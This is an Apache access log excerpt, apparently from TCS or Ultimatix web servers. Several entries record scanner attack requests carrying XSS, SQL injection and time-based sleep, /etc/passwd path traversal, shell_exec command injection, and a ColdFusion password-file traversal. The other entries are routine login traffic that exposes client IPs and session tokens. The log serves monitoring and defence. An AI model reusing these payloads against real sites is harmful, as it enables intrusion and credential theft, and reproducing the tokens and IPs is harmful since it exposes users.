logevent
<150>Dec  3 04:38:56 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 12345 abc.example.net - - [03/Dec/2025:04:38:56 +0530] "GET /?eqbzeyas=<script>alert("XSS");</script>&ygocslug=UNION+SELECT+ALL+FROM+information_schema+AND+"+or+SLEEP(5)+or+"&dqohnhch=../../etc/passwd HTTP/1.1" 302 - 1 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0"
<150>Dec  3 04:44:30 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 12345 abc.example.net - - [03/Dec/2025:04:44:30 +0530] "GET /?kowuoxxn=<script>alert("XSS");</script>&gfqfjree=UNION+SELECT+ALL+FROM+information_schema+AND+"+or+SLEEP(5)+or+"&gxbvyjem=../../etc/passwd HTTP/1.1" 302 - 2 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0"
<150>Dec 24 01:01:42 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 12345 abc.example.net - - [24/Dec/2025:01:01:42 +0530] "POST /ajax.php?do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/&result=10 HTTP/1.1" 200 735 4 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
<150>Dec 22 00:12:56 servernameabc httpd[12345]: 0.0.0.0 0.1.0.1 - - [22/Dec/2025:00:12:56 +0000] "GET /content.statementList.fetchJson?searchIn=/content/dam/tcs/investor-relations/financial-statements&selectedQuarter=q3&haiku630498=shell_exec(ifconfig) HTTP/1.1" 200 2667 "https://www.tcs.com/investor-relations/financial-statements" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.186 Electron/32.3.3 Safari/537.36" -- 0 @ 10805 --
<150>Dec  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 - - - [03/Dec/2025:13:45:33 +0530] "GET /cgi-bin/htmlscript?../../../../../../../etc/passwd HTTP/1.1" 403 199 24 0 "-" "-"
<150>Dec  3 13:45:33 servernameabc httpd[1501791]: 0.0.0.0 - - - [03/Dec/2025:13:45:33 +0530] "GET /CFIDE/adminapi/customtags/l10n.cfm?attributes.id=test&attributes.file=../../administrator/mail/download.cfm&filename=../lib/password.properties&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=test HTTP/1.1" 403 199 18138 0 "-" "-"
<150>Feb 18 18:03:02 CDCDRUXPUAMW03 httpd[563513]: 10.16.189.21 193.105.74.58 - - [18/Feb/2026:18:03:02 +0530] "GET /utxLogin/login?TYPE=33554432&REALMOID=06-000e128c-664b-1c1a-9ba7-abcac0a8f081&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=-SM-hH4s%2bx89e0zLyyJB26KwxN5y7fGJNanRUhav0qPo%2f9tiGbWXhsZrLgoPW%2fGInc1a&TARGET=-SM-https%3a%2f%2fwww%2eultimatix%2enet%2futxHomeApp%2fredirectToHome HTTP/1.1" 200 28835 10559 0 "-" "AHC/2.1"
<150>Feb 18 18:03:02 CDCDRUXPUAMW03 httpd[563513]: 10.16.189.12 17.233.98.210 - - [18/Feb/2026:18:03:02 +0530] "GET /login/txt/termsOfUse.txt?_=1771417981959 HTTP/1.1" 200 614 3680 0 "https://auth.ultimatix.net/utxLogin/login?TYPE=33554432&REALMOID=06-9374027c-7828-4b8f-9228-94f04c85cf02&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=-SM-bTbWmMDaRO7AEhCWoLgifk03vMcg8mkpFSu%2bZ1pErxChZzvPeUME%2bBhFK4LomTnL&TARGET=-SM-HTTPS%3a%2f%2fauthapp%2eultimatix%2enet%2fultimatix%2fredirect%2fredirect%2ejsp%3fSAMLRequest%3dfVLLTsMwELz3K6Lc80Zpa7WVQitEJR4RLRy4IDfeUEuJbbwOlL-%2FHdnkeqE-%2F27sx4Z-%2BwZ0r5TpBrMXtzBywBoRkFw6DuBxLfm4aAFkRQ5EkF7QGIasqmur0gep0RpaWQju-%2FAP6TSHIoI2XApHWq-%2FmoaM8sbScTot0krZlOd3lk3JcQNNSKMppxlg-%2BHsPkbFxC6UgPoNHy56GVc-%2BcgqLV85Qz0jb1tHm7qwFgjXh9xgLVAQ4Wx-%2BDQvozSPssk2y0lRkDR9dKiVRXNBjRfdG6OQJAm1mVCl4qEzvLe9QyzAJLRt32BnHbzyBjBRw67jTeIs5IjSidWfmZxzwbh4Ph3G7ghCcrnd1lF9u9k6ieoroqUUOPSgN8f77u-%2Bufubr3-%2B10cFCxadDuMG5k7weJOFPHbrjw6cxclfgo9OIUfZb8Rv5wFXHBrle1tGbffd2tC6ltMP8bzOLMVziLWg8l0FPeVYxpQAy-%2Fdaquk29LDdTYxzN6gDBIFqPRcZq-%2Fn3PxAQ-%3D-%3D%26Relay
<150>Feb 18 18:03:02 CDCUPGHDLSG01 httpd[157169]: 10.40.54.114 106.222.231.91 - nextgenghd.ultimatix.net - - [18/Feb/2026:18:03:02 +0530] "POST /NextGenGHDIncidentService/rest/selfHelpTrack HTTP/1.1" 200 109 62 "https://nextgenghd.ultimatix.net/NextGenGHDUI/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"
<150>Feb 18 18:03:02 CDCDRUXPUAMW04 httpd[13107]: 10.16.189.13 152.57.239.99 - - [18/Feb/2026:18:03:01 +0530] "GET /mobileLogin/utxMOTLLogin/validate HTTP/1.1" 200 48 "-" "Mozilla/5.0 (Linux; Android 15; V2443 Build/AP3A.240905.015.A2_V000L1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.132 Mobile Safari/537.36"
